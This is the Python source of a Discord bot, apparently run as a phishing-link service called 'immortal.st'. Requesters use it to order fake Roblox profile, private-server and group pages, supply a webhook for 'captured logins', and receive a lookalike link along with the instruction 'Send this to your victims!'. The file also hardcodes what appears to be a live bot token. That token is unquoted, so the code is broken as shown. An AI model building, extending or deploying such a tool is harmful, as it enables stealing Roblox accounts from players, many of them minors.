import nextcord
from nextcord import Interaction, SlashOption
from nextcord.ext import commands
import requests
import json

# ========== CONFIG ==========
TOKEN = MTUyNDQxODgyMzQwOTYzMTM2Mg.Gzm7b9.p4h0GxUmsA7aRZTy8DbSjMo8xcxI-rQRwtFvow
YOUR_DISCORD_ID = 1498040726733328576
GUILD_ID = 1524402098173776042

intents = nextcord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

pending_requests = {}

def send_webhook(webhook_url, embed_dict, content=None):
    data = {
        "username": "immortal.st Generator",
        "avatar_url": "https://i.imgur.com/0Zz7H4h.png",
    }
    if content:
        data["content"] = content
    data["embeds"] = [embed_dict]
    try:
        r = requests.post(webhook_url, json=data)
        return r.status_code == 204 or r.status_code == 200
    except:
        return False

@bot.slash_command(name="generate", description="Create a Roblox phishing link", guild_ids=[GUILD_ID])
async def generate(interaction: Interaction):
    view = TypeSelector()
    await interaction.response.send_message(
        "**Choose what type of link you want to create:**",
        view=view,
        ephemeral=True
    )

class TypeSelector(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=120)

    @nextcord.ui.button(label="Profile", style=nextcord.ButtonStyle.green, emoji="👤")
    async def profile_btn(self, button: nextcord.ui.Button, interaction: Interaction):
        await interaction.response.send_modal(ProfileModal())

    @nextcord.ui.button(label="Private Server", style=nextcord.ButtonStyle.blurple, emoji="🔵")
    async def ps_btn(self, button: nextcord.ui.Button, interaction: Interaction):
        await interaction.response.send_modal(PserverModal())

    @nextcord.ui.button(label="Group", style=nextcord.ButtonStyle.gray, emoji="🟡")
    async def group_btn(self, button: nextcord.ui.Button, interaction: Interaction):
        await interaction.response.send_modal(GroupModal())

class ProfileModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("Configure Roblox Profile", timeout=300)
        self.username = nextcord.ui.TextInput(label="Roblox Username", placeholder="e.g. xX_FakePlayer_Xx", required=True, max_length=20)
        self.add_item(self.username)
        self.followers = nextcord.ui.TextInput(label="Followers", placeholder="e.g. 12,345", required=True, max_length=10)
        self.add_item(self.followers)
        self.friends = nextcord.ui.TextInput(label="Friends", placeholder="e.g. 678", required=True, max_length=10)
        self.add_item(self.friends)
        self.premium = nextcord.ui.TextInput(label="Roblox Premium? (yes/no)", placeholder="yes or no", required=True, max_length=3)
        self.add_item(self.premium)
        self.webhook = nextcord.ui.TextInput(label="Your Webhook URL (for captured logins)", placeholder="https://discord.com/api/webhooks/...", required=True, max_length=250)
        self.add_item(self.webhook)

    async def callback(self, interaction: Interaction):
        user = interaction.user
        embed = {
            "title": "🆕 New Profile Request",
            "color": 0x00ff00,
            "thumbnail": {"url": "https://i.imgur.com/0Zz7H4h.png"},
            "fields": [
                {"name": "Requested by", "value": f"{user} (ID: {user.id})", "inline": False},
                {"name": "Username", "value": self.username.value, "inline": True},
                {"name": "Followers", "value": self.followers.value, "inline": True},
                {"name": "Friends", "value": self.friends.value, "inline": True},
                {"name": "Premium", "value": self.premium.value, "inline": True},
                {"name": "Type", "value": "👤 Profile", "inline": True},
            ],
            "footer": {"text": "immortal.st • Click ✅ Done when link is ready"},
        }
        webhook_sent = send_webhook(self.webhook.value, embed, content="📩 **Your request was received by the operator!**")
        pending_requests[user.id] = {
            "type": "profile", "username": self.username.value, "followers": self.followers.value,
            "friends": self.friends.value, "premium": self.premium.value,
            "webhook": self.webhook.value, "user": user, "webhook_sent": webhook_sent
        }
        owner = await bot.fetch_user(YOUR_DISCORD_ID)
        view = DoneButton(user_id=user.id)
        embed_to_owner = {
            "title": "🆕 Profile Request — PENDING", "color": 0x00ff00,
            "thumbnail": {"url": "https://i.imgur.com/0Zz7H4h.png"},
            "fields": [
                {"name": "Requested by", "value": f"{user} (ID: {user.id})", "inline": False},
                {"name": "Username", "value": self.username.value, "inline": True},
                {"name": "Followers", "value": self.followers.value, "inline": True},
                {"name": "Friends", "value": self.friends.value, "inline": True},
                {"name": "Premium", "value": self.premium.value, "inline": True},
                {"name": "Webhook Sent?", "value": "✅ Yes" if webhook_sent else "❌ Failed", "inline": True},
                {"name": "Status", "value": "⏳ Awaiting your action", "inline": False},
            ],
            "footer": {"text": "Press ✅ Done when link is ready on immortal.st"},
        }
        await owner.send(embed=nextcord.Embed().from_dict(embed_to_owner), view=view)
        await interaction.response.edit_message(content="✅ **Request sent to operator!** Your link will be delivered here once ready.", view=None)

class PserverModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("Configure Private Server", timeout=300)
        self.game_name = nextcord.ui.TextInput(label="Roblox Game Name", placeholder="e.g. Blox Fruits", required=True, max_length=50)
        self.add_item(self.game_name)
        self.game_url = nextcord.ui.TextInput(label="Game URL", placeholder="https://www.roblox.com/games/12345/...", required=True, max_length=200)
        self.add_item(self.game_url)
        self.domain = nextcord.ui.TextInput(label="Domain ending", placeholder=".bz (recommended)", required=True, max_length=5, default_value=".bz")
        self.add_item(self.domain)
        self.webhook = nextcord.ui.TextInput(label="Your Webhook URL", placeholder="https://discord.com/api/webhooks/...", required=True, max_length=250)
        self.add_item(self.webhook)

    async def callback(self, interaction: Interaction):
        user = interaction.user
        embed = {
            "title": "🔵 New Private Server Request", "color": 0x3498db,
            "thumbnail": {"url": "https://i.imgur.com/0Zz7H4h.png"},
            "fields": [
                {"name": "Requested by", "value": f"{user} (ID: {user.id})", "inline": False},
                {"name": "Game Name", "value": self.game_name.value, "inline": True},
                {"name": "Game URL", "value": self.game_url.value, "inline": False},
                {"name": "Domain Ending", "value": self.domain.value, "inline": True},
                {"name": "Type", "value": "🔵 Private Server", "inline": True},
            ],
            "footer": {"text": "immortal.st • Click ✅ Done when link is ready"},
        }
        webhook_sent = send_webhook(self.webhook.value, embed, content="📩 **Private server request received by operator!**")
        pending_requests[user.id] = {
            "type": "pserver", "game_name": self.game_name.value, "game_url": self.game_url.value,
            "domain": self.domain.value, "webhook": self.webhook.value, "user": user, "webhook_sent": webhook_sent
        }
        owner = await bot.fetch_user(YOUR_DISCORD_ID)
        view = DoneButton(user_id=user.id)
        embed_to_owner = {
            "title": "🔵 Private Server Request — PENDING", "color": 0x3498db,
            "thumbnail": {"url": "https://i.imgur.com/0Zz7H4h.png"},
            "fields": [
                {"name": "Requested by", "value": f"{user} (ID: {user.id})", "inline": False},
                {"name": "Game Name", "value": self.game_name.value, "inline": True},
                {"name": "Game URL", "value": self.game_url.value, "inline": False},
                {"name": "Domain", "value": self.domain.value, "inline": True},
                {"name": "Webhook Sent?", "value": "✅ Yes" if webhook_sent else "❌ Failed", "inline": True},
                {"name": "Status", "value": "⏳ Awaiting your action", "inline": False},
            ],
            "footer": {"text": "Press ✅ Done when link is ready on immortal.st"},
        }
        await owner.send(embed=nextcord.Embed().from_dict(embed_to_owner), view=view)
        await interaction.response.edit_message(content="✅ **Request sent!** Your link will be delivered here once ready.", view=None)

class GroupModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("Configure Roblox Group", timeout=300)
        self.group_name = nextcord.ui.TextInput(label="Group Name", placeholder="e.g. Best Trading Group", required=True, max_length=50)
        self.add_item(self.group_name)
        self.member_count = nextcord.ui.TextInput(label="Member Count", placeholder="e.g. 50,000", required=True, max_length=10)
        self.add_item(self.member_count)
        self.fake_payouts = nextcord.ui.TextInput(label="Fake Payouts / Description", placeholder="e.g. Daily 10K Robux giveaways", required=True, max_length=200, style=nextcord.TextInputStyle.paragraph)
        self.add_item(self.fake_payouts)
        self.webhook = nextcord.ui.TextInput(label="Your Webhook URL", placeholder="https://discord.com/api/webhooks/...", required=True, max_length=250)
        self.add_item(self.webhook)

    async def callback(self, interaction: Interaction):
        user = interaction.user
        embed = {
            "title": "🟡 New Group Request", "color": 0xf1c40f,
            "thumbnail": {"url": "https://i.imgur.com/0Zz7H4h.png"},
            "fields": [
                {"name": "Requested by", "value": f"{user} (ID: {user.id})", "inline": False},
                {"name": "Group Name", "value": self.group_name.value, "inline": True},
                {"name": "Member Count", "value": self.member_count.value, "inline": True},
                {"name": "Fake Payouts", "value": self.fake_payouts.value, "inline": False},
                {"name": "Type", "value": "🟡 Group", "inline": True},
            ],
            "footer": {"text": "immortal.st • Click ✅ Done when link is ready"},
        }
        webhook_sent = send_webhook(self.webhook.value, embed, content="📩 **Group request received by operator!**")
        pending_requests[user.id] = {
            "type": "group", "group_name": self.group_name.value, "member_count": self.member_count.value,
            "fake_payouts": self.fake_payouts.value, "webhook": self.webhook.value, "user": user, "webhook_sent": webhook_sent
        }
        owner = await bot.fetch_user(YOUR_DISCORD_ID)
        view = DoneButton(user_id=user.id)
        embed_to_owner = {
            "title": "🟡 Group Request — PENDING", "color": 0xf1c40f,
            "thumbnail": {"url": "https://i.imgur.com/0Zz7H4h.png"},
            "fields": [
                {"name": "Requested by", "value": f"{user} (ID: {user.id})", "inline": False},
                {"name": "Group Name", "value": self.group_name.value, "inline": True},
                {"name": "Member Count", "value": self.member_count.value, "inline": True},
                {"name": "Fake Payouts", "value": self.fake_payouts.value, "inline": False},
                {"name": "Webhook Sent?", "value": "✅ Yes" if webhook_sent else "❌ Failed", "inline": True},
                {"name": "Status", "value": "⏳ Awaiting your action", "inline": False},
            ],
            "footer": {"text": "Press ✅ Done when link is ready on immortal.st"},
        }
        await owner.send(embed=nextcord.Embed().from_dict(embed_to_owner), view=view)
        await interaction.response.edit_message(content="✅ **Request sent!** Your link will be delivered here once ready.", view=None)

class DoneButton(nextcord.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id

    @nextcord.ui.button(label="✅ Done — Link Ready", style=nextcord.ButtonStyle.green, custom_id="done_btn")
    async def done_btn(self, button: nextcord.ui.Button, interaction: Interaction):
        if interaction.user.id != YOUR_DISCORD_ID:
            await interaction.response.send_message("❌ Only the bot operator can press this.", ephemeral=True)
            return
        await interaction.response.send_modal(LinkInputModal(self.user_id))

class LinkInputModal(nextcord.ui.Modal):
    def __init__(self, user_id):
        super().__init__("Enter the finished link", timeout=300)
        self.user_id = user_id
        self.final_link = nextcord.ui.TextInput(label="The finished phishing link", placeholder="https://roblox.com.bz/YourLink", required=True, max_length=300)
        self.add_item(self.final_link)

    async def callback(self, interaction: Interaction):
        user_id = self.user_id
        link = self.final_link.value.strip()
        if user_id not in pending_requests:
            await interaction.response.send_message("❌ This request expired or was already completed.", ephemeral=True)
            return
        data = pending_requests[user_id]
        target_user = data["user"]
        try:
            embed = nextcord.Embed(
                title="🔗 Your Link is Ready!",
                description=f"```\n{link}\n```\n\n**Send this to your victims!**\nThey login → you get their info via your webhook.",
                color=0x00ff00
            )
            view = nextcord.ui.View()
            view.add_item(nextcord.ui.Button(label="🔗 Open Link", url=link, style=nextcord.ButtonStyle.url))
            view.add_item(nextcord.ui.Button(label="📋 Copy Link", url=link, style=nextcord.ButtonStyle.secondary))
            await target_user.send(content=f"**✅ Your Roblox phishing link is ready!**\n{link}", embed=embed, view=view)
            del pending_requests[user_id]
            await interaction.response.send_message(f"✅ Link sent to **{target_user}**! ({link})")
        except nextcord.Forbidden:
            await interaction.response.send_message("❌ User has DMs disabled.")
        except Exception as e:
            await interaction.response.send_message(f"❌ Error: {e}")

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    print(f"✅ Your Discord ID: {YOUR_DISCORD_ID}")
    print(f"✅ Server ID: {GUILD_ID}")
    print("--- Bot is ready! Use /generate ---")

bot.run(TOKEN)
